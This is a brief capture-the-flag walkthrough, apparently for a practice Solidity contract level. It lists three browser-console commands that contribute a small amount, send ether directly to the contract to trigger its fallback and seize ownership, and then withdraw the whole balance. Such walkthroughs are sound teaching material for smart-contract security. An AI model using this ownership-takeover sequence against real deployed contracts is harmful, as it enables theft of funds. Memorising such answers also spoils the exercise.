# In the Console

1.  To satisfy `contributions[msg.sender] > 0` in the fallback method:<br/>
    `await contract.contribute({ value: toWei("0.0001") })`
2.  To become the new owner: <br/>
    `await sendTransaction({ from: player, to: contract.address, value: 10000 }`)
3.  Withdraw the balance of the contract: <br/>
    `await contract.withdraw()`
